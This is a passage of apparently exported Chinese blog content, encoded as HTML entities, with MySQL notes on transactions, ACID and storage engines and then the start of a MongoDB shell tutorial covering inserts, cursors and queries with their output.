&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x53EF;&#x5206;&#x5272;&#x7684;&#x5DE5;&#x4F5C;&#x5355;&#x4F4D;&#x3002;&#x4F8B;&#x5982;,&#x94F6;&#x884C;&#x8F6C;&#x5E10;&#x5DE5;&#x4F5C;:&#x4ECE;&#x4E00;&#x4E2A;&#x5E10;&#x53F7;&#x6263;&#x6B3E;&#x5E76; &#x4F7F;&#x53E6;&#x4E00;&#x4E2A;&#x5E10;&#x53F7;&#x589E;&#x6B3E;,&#x8FD9;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x8981;&#x4E48;&#x90FD;&#x6267;&#x884C;,&#x8981;&#x4E48;&#x90FD;&#x4E0D;&#x6267;&#x884C;&#x3002; &#x4E8B;&#x52A1;&#x7684;&#x56DB;&#x5927;&#x7279;&#x6027;ACID &#x539F;&#x5B50;&#x6027;&#xFF08;Atomicity&#xFF09;&#x4E8B;&#x52A1;&#x662F;&#x4E00;&#x4E2A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x7531;&#x4E00;&#x7CFB;&#x5217;&#x52A8;&#x4F5C;&#x7EC4;&#x6210;&#x3002;&#x4E8B;&#x52A1;&#x7684;&#x539F;&#x5B50;&#x6027;&#x786E;&#x4FDD;&#x52A8;&#x4F5C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#xFF0C;&#x8981;&#x4E48;&#x5B8C;&#x5168;&#x4E0D;&#x8D77;&#x4F5C;&#x7528;&#x3002; &#x4E00;&#x81F4;&#x6027;&#xFF08;Consistency&#xFF09;&#x4E8B;&#x52A1;&#x5728;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x90FD;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x72B6;&#x6001;&#x3002; &#x9694;&#x79BB;&#x6027;&#xFF08;Isolation&#xFF09;&#x5E76;&#x53D1;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x4E4B;&#x95F4;&#x65E0;&#x5F71;&#x54CD;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x5185;&#x90E8;&#x7684;&#x64CD;&#x4F5C;&#x5BF9;&#x5176;&#x4ED6;&#x4E8B;&#x52A1;&#x662F;&#x4E0D;&#x4EA7;&#x751F;&#x5F71;&#x54CD;&#xFF0C;&#x8FD9;&#x9700;&#x8981;&#x4E8B;&#x52A1;&#x9694;&#x79BB;&#x7EA7;&#x522B;&#x6765;&#x6307;&#x5B9A;&#x9694;&#x79BB;&#x6027;&#x3002; &#x6301;&#x4E45;&#x6027;&#xFF08;Durability&#xFF09;&#x4E00;&#x65E6;&#x4E8B;&#x52A1;&#x5B8C;&#x6210;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6539;&#x53D8;&#x5FC5;&#x987B;&#x662F;&#x6301;&#x4E45;&#x5316;&#x7684;&#x3002; &#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE; show engines;&#x521B;&#x5EFA;&#x8868;&#x6307;&#x5B9A;&#x5B58;&#x50A8;&#x5F15;&#x64CE; create table tbname (id int,name char(20),age int) engine=myisam;&#x67E5;&#x770B;&#x8868;&#x7684;&#x5C5E;&#x6027; use dbname; show table status where name=&#x2019;tbname&#x2019;; &#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;&#x4E3A;&#x4E86;&#x5B66;&#x4E60;&#x66F4;&#x591A;&#x7684;MySQL&#x77E5;&#x8BC6;,&#x8BF7;&#x8BBF;&#x95EE;MySQL&#x5B98;&#x7F51; https://www.mysql.com/ &#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;MySQL &#x62E5;&#x6709;&#x5E9E;&#x5927;&#x7684;&#x7528;&#x6237;&#x7FA4;,&#x56FD;&#x5916;&#x7684;&#x6709; Facebook&#x3001;Flickr&#x3001;eBay &#x7B49;,&#x56FD;&#x5185;&#x7684;&#x6709;&#x963F;&#x91CC;&#x3001;&#x817E;&#x8BAF;&#x3001;&#x65B0;&#x6D6A;&#x3001;&#x767E;&#x5EA6;&#x7B49;&#x3002;&#x800C;&#x8FD9;&#x4E9B;&#x4E92;&#x8054;&#x7F51;&#x548C;&#x5927;&#x90E8;&#x5206;&#x4F20;&#x7EDF;&#x516C;&#x53F8;&#x7684;&#x670D;&#x52A1;&#x9700;&#x8981;7&#xD7;24&#x5C0F;&#x65F6;&#x8FDE;&#x7EED;&#x5DE5;&#x4F5C;&#x3002;&#x5F53;&#x6B64;&#x7C7B;&#x578B;&#x7F51;&#x7AD9;&#x7684;&#x90E8;&#x5206;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x65F6;,&#x5C31;&#x9700;&#x8981;&#x9AD8;&#x53EF;&#x7528;&#x6280;&#x672F;&#x5C06;&#x6D41;&#x91CF;&#x7275;&#x5F15;&#x81F3;&#x5907;&#x4EFD;&#x4E3B;&#x673A;,&#x4ECE;&#x800C;&#x6B64;&#x65F6;&#x8FD9;&#x4E9B;&#x516C;&#x53F8;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5907;&#x4EFD;&#x548C;&#x6062;&#x590D;&#x624B;&#x6BB5;&#x6765;&#x4EA7;&#x751F;&#x5907;&#x673A;,&#x5E76;&#x901A;&#x8FC7;&#x590D;&#x5236;&#x6765;&#x540C;&#x6B65;&#x4E3B;&#x5907;&#x673A;&#x95F4;&#x7684;&#x72B6;&#x6001;,&#x540C;&#x65F6;&#x90E8;&#x7F72;&#x5404;&#x79CD;&#x76D1;&#x63A7;&#x8F6F;&#x4EF6;&#x6765;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x5668;&#x72B6;&#x6001;&#x3002;&#x5F53;&#x5F02;&#x5E38;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x65F6;,&#x901A;&#x8FC7;&#x624B;&#x5DE5;&#x6216;&#x81EA;&#x52A8;&#x5316;&#x624B;&#x6BB5;&#x5C06;&#x4E3B;&#x673A;&#x6D41;&#x91CF;&#x5207;&#x6362;&#x81F3;&#x5907;&#x673A;,&#x8FD9;&#x4E2A;&#x52A8;&#x4F5C;&#x53EB;&#x4F5C;failover&#x3002;&#x800C;&#x4E00;&#x4E9B;&#x5927;&#x578B;&#x516C;&#x53F8;&#x5728;&#x9762;&#x5BF9;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x53F0; MySQL &#x670D;&#x52A1;&#x5668;&#x65F6;,&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x811A;&#x672C;&#x6216;&#x7A0B;&#x5E8F;&#x5B8C;&#x6210;&#x4E0A;&#x8FF0;&#x79CD;&#x79CD;&#x52A8;&#x4F5C;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MongoDB学习笔记","date":"2022-06-07T04:43:09.000Z","path":"/posts/a36562d7/","text":"&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;# mongo MongoDB shell version v3.6.13 connecting to: test &gt; &#x9ED8;&#x8BA4;shell&#x8FDE;&#x63A5;&#x7684;&#x662F;&#x672C;&#x673A;localhost&#xFF0C;nonnecting to:&#x663E;&#x793A;&#x4F60;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#xFF0C;&#x2019;test&#x2019;&#x662F;MongoDB&#x7684;&#x9ED8;&#x8BA4;&#x5E93;&#xFF0C;&#x5207;&#x6362;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;use &apos;dbName&apos;&#x547D;&#x4EE4; &#x63D2;&#x5165;&#x8BB0;&#x5F55;&gt; j = {name:&quot;mongo&quot;}; { &quot;name&quot; : &quot;mongo&quot; } &gt; t={x:3} { &quot;x&quot; : 3 } &gt; db.things.save(j) WriteResult({ &quot;nInserted&quot; : 1 }) &gt; db.things.save(t) WriteResult({ &quot;nInserted&quot; : 1 }) &gt; db.things.find() { &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; } { &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 } &#x4E0D;&#x9700;&#x8981;&#x9884;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#xFF0C;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#x5019;&#x4F1A;&#x81EA;&#x52A8;&#x521B;&#x5EFA;. &#x5728;&#x6587;&#x6863;&#x6C47;&#x603B;&#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x4EFB;&#x4F55;&#x7ED3;&#x6784;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5F53;&#x7136;&#x5728;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x6211;&#x4EEC;&#x5B58;&#x50A8;&#x7684;&#x8FD8;&#x662F;&#x76F8;&#x540C;&#x7C7B;&#x578B;&#x6587;&#x6863;&#x7684;&#x96C6;&#x5408; &#x6BCF;&#x6B21;&#x63D2;&#x5165;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x96C6;&#x5408;&#x4E2D;&#x90FD;&#x4F1A;&#x6709; &#x4E00;&#x4E2A;ID&#xFF0C;&#x540D;&#x5B57;&#x53EB;_id. &#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x63D2;&#x5165;1234567891011121314&gt; for(var i=1;i&lt;=10;i++)db.c2.insert({name:&quot;user&quot;+i, age:18+i})WriteResult({ &quot;nInserted&quot; : 1 })&gt; db.c2.find(){ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;), &quot;name&quot; : &quot;user1&quot;, &quot;age&quot; : 19 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;), &quot;name&quot; : &quot;user2&quot;, &quot;age&quot; : 20 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ad&quot;), &quot;name&quot; : &quot;user3&quot;, &quot;age&quot; : 21 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;), &quot;name&quot; : &quot;user4&quot;, &quot;age&quot; : 22 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97af&quot;), &quot;name&quot; : &quot;user5&quot;, &quot;age&quot; : 23 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;), &quot;name&quot; : &quot;user6&quot;, &quot;age&quot; : 24 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;), &quot;name&quot; : &quot;user7&quot;, &quot;age&quot; : 25 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;), &quot;name&quot; : &quot;user8&quot;, &quot;age&quot; : 26 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b3&quot;), &quot;name&quot; : &quot;user9&quot;, &quot;age&quot; : 27 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;), &quot;name&quot; : &quot;user10&quot;, &quot;age&quot; : 28 }&gt; _id keyMongoDB&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E2D;&#xFF0C;_id&#x662F;&#x5176;&#x81EA;&#x6709;&#x4EA7;&#x7269;&#x3002; &#x5B58;&#x50A8;&#x5728;MongoDB&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x6587;&#x6863;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x7684;&#x4E3B;&#x952E; _id &#xFF0C; &#x8FD9;&#x4E2A;&#x4E3B;&#x952E;&#x540D;&#x79F0;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x662F;MongoDB&#x652F;&#x6301;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;ObjectId&#x3002; _id key &#x4E3E;&#x4F8B;&#x8BF4;&#x660E; db.test.find() { &quot;_id&quot; : ObjectId(&quot;627d3ef6de66cb02cb45d3e1&quot;), &quot;name&quot; : &quot;zhangya&quot;, &quot;age&quot; : &quot;21&quot;, &quot;addr&quot; : &quot;&#x5317;&#x4EAC;&#x5E02;&#x671D;&#x9633;&#x533A;&quot; } { &quot;_id&quot; : ObjectId(&quot;627d3fffde66cb02cb45d3e2&quot;), &quot;name&quot; : &quot;zhang3&quot;, &quot;age&quot; : &quot;24&quot;, &quot;addr&quot; : &quot;&#x4E0A;&#x6D77;&#x6D66;&#x4E1C;&#x533A;&quot; } &gt; &#x5728;MongoDB&#x4E2D;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x90FD;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x4E2A;&#x53EB;&#x505A;_id&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x5B57;&#x6BB5;&#x7684;&#x9ED8;&#x8BA4;&#x7C7B;&#x578B;&#x662F;ObjectId&#xFF0C;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x4E0D;&#x662F;ObjectId&#xFF0C;&#x4F8B;&#x5982;&#xFF1A; db.collection.insert 1234567891011121314&gt; db.things.insert({_id:3,name:&quot;Bill&quot;,age:34})&gt; db.things.find(){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 } &#xFF01;&#x867D;&#x7136;_id &#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x6307;&#x5B9A;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x4E2D;&#x5FC5;&#x987B;&#x552F;&#x4E00;&#xFF0C;&#x5982;&#x679C;&#x63D2;&#x5165;&#x91CD;&#x590D;&#x503C;&#x7684;&#x8BDD;&#x7CFB;&#x7EDF;&#x5C06;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38; db.collection.insertOne()123456&gt; db.test.insertOne({name:&quot;fnaichu&quot;, age: 24}){ &quot;acknowledged&quot; : true, &quot;insertedId&quot; : ObjectId(&quot;627f80462c1c696497b0e31e&quot;)}&gt; db.collection.insertMany()12345678910111213&gt; db.test.insertMany([... {name:&quot;li4&quot;, age: 35, addr:&quot;&#x5E7F;&#x5DDE;&#x5E02;&quot;},... {name:&quot;wang5&quot;, age: 42, addr:&quot;&#x5357;&#x4EAC;&#x5E02;&quot;},... {name:&quot;qiang7&quot;, age: 28, addr:&quot;&#x4E0A;&#x6D77;&#x5E02;&quot;}]){ &quot;acknowledged&quot; : true, &quot;insertedIds&quot; : [ ObjectId(&quot;627f82648f2637720618c4f4&quot;), ObjectId(&quot;627f82648f2637720618c4f5&quot;), ObjectId(&quot;627f82648f2637720618c4f6&quot;) ]}&gt; &#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x666E;&#x901A;&#x67E5;&#x8BE2;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;&#x901A;&#x8FC7;find()&#x6765;&#x67E5;&#x8BE2;&#xFF0C;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;&#x7ED3;&#x6784;&#x7684;&#x96C6;&#x5408; 123456789101112131415&gt; var cursor=db.things.find()&gt; while(cursor.hasNext()) printjson(cursor.next()){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt; &#x4E0A;&#x9762;&#x4F8B;&#x5B50;&#x663E;&#x793A;&#x4E86;&#x6E38;&#x6807;&#x98CE;&#x683C;&#x7684;&#x8FED;&#x4EE3;&#x8F93;&#x51FA;&#x3002;hasNext()&#x51FD;&#x6570;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x8FD8;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5219;&#x53EF;&#x4EE5;&#x8C03;&#x7528;next()&#x51FD;&#x6570;. &#x5F53;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x662F;JavaScript shell&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x5230;JS&#x7684;&#x7279;&#x6027;&#xFF0C;forEach&#x5C31;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x6E38;&#x6807;&#x4E86;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x4F7F;&#x7528;forEach()&#x6765;&#x5FAA;&#x73AF;&#x8F93;&#x51FA;&#x7684;: forEach()&#x5FC5;&#x987B;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x4F9B;&#x6BCF;&#x4E2A;&#x6E38;&#x6807;&#x5143;&#x7D20;&#x8C03;&#x7528;&#xFF1A;1234567891011121314&gt; db.things.find().forEach(printjson){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt; &#x5728;MongoDB shell&#x91CC;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x628A;&#x6E38;&#x6807;&#x5F53;&#x4F5C;&#x6570;&#x7EC4;&#x6765;&#x7528;&#xFF1A;123456789var cursor=db.things.find()&gt; printjson(cursor[1]){ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }&gt; printjson(cursor[2]){ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }&gt; printjson(cursor[0]){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }&gt; printjson(cursor[12])undefined &#x4F7F;&#x7528;&#x6E38;&#x6807;&#x7684;&#x65F6;&#x5019;&#x8BF7;&#x6CE8;&#x610F;&#x5360;&#x7528;&#x5185;&#x5B58;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5F88;&#x5927;&#x7684;&#x6E38;&#x6807;&#x5BF9;&#x8C61;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#x3002;&#x6240;&#x4EE5;&#x5E94;&#x8BE5;&#x7528;&#x8FED;&#x4EE3;&#x7684;&#x65B9;&#x5F0F;&#x8F93;&#x51FA;&#x3002;&#x628A;&#x6E38;&#x6807;&#x8F6C;&#x6362;&#x6210;&#x771F;&#x5B9E;&#x7684;&#x6570;&#x7EC4;&#x7C7B;&#x578B;&#xFF1A;1234567&gt; var arr=db.things.find().toArray()&gt; arr[0]{ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }&gt; arr[11]{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt; arr[12]&gt; &#x8BF7;&#x6CE8;&#x610F;&#x8FD9;&#x4E9B;&#x7279;&#x6027;&#x77E5;&#x8BC6;&#x5728;MongoDB shell&#x91CC;&#x4F7F;&#x7528;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x9A71;&#x52A8;&#x90FD;&#x652F;&#x6301;&#x3002;MongoDB&#x6E38;&#x6807;&#x5BF9;&#x8C61;&#x4E0D;&#x662F;&#x6CA1;&#x6709;&#x5FEB;&#x7167;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x5728;&#x96C6;&#x5408;&#x91CC;&#x7B2C;&#x4E00;&#x6B21;&#x6216;&#x8005;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x8C03;&#x7528;next()&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x5F97;&#x4E0D;&#x5230;&#x6E38;&#x6807;&#x91CC;&#x7684;&#x6570;&#x636E;&#x3002;&#x6240;&#x4EE5;&#x8981;&#x660E;&#x786E;&#x7684;&#x9501;&#x5B9A;&#x4F60;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x6E38;&#x6807;&#x3002; &#x6761;&#x4EF6;&#x67E5;&#x8BE2;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;SQL&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x662F;&#x600E;&#x4E48;&#x5728;MongoDB&#x91CC;&#x5B9E;&#x73B0;&#x7684;&#xFF1F;&#x8FD9;&#x91CC;&#x662F;&#x5728;MongoDB shell&#x91CC;&#x67E5;&#x8BE2;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x5176;&#x4ED6;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x9A71;&#x52A8;&#x6216;&#x8005;&#x8BED;&#x8A00;&#x6765;&#x5B9E;&#x73B0;&#xFF1A;| || &#x2014; || SQL&#xFF1A; || SELECT * FROM things WHERE name=&#x201D;mongo&#x201D;; || MongoDB&#xFF1A; || db.things.find({name:&#x201D;mongo&#x201D;}).forEach(printjson) | SQL&#xFF1A; SELECT * FROM things WHERE x=4; MongoDB&#xFF1A; db.things.find({x:4}).forEach(printjson) &#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x65F6;{a:A, b:B}&#x7C7B;&#x4F3C;&#x4E8E;where a==A and b==B and ... &#x4E0A;&#x9762;&#x663E;&#x793A;&#x7684;&#x662F;&#x6240;&#x6709;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x7279;&#x5B9A;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;&#x8FD4;&#x56DE;&#x8868;&#x91CC;&#x7684;&#x67D0;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728;find({x:4})&#x91CC;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x7684;&#x540D;&#x5B57; SQL&#xFF1A; SELECT j FROM things WHERE x=4 MongoDB&#xFF1A; db.things.find({x:4},{j:true}) findOne()&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8003;&#x8651;&#xFF0C;MongoDB shell&#x907F;&#x514D;&#x6E38;&#x6807;&#x53EF;&#x80FD;&#x5E26;&#x6765;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;findOne()&#x51FD;&#x6570;&#x3002;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x548C;find()&#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x8FC7;&#x5B83;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6E38;&#x6807;&#x91CC;&#x7684;&#x7B2C;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5185;&#x5BB9;&#x5219;&#x8FD4;&#x56DE;null&#x503C;&#x3002; 123&gt; printjson(db.things.findOne({name:&quot;mongo&quot;})){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }&gt; 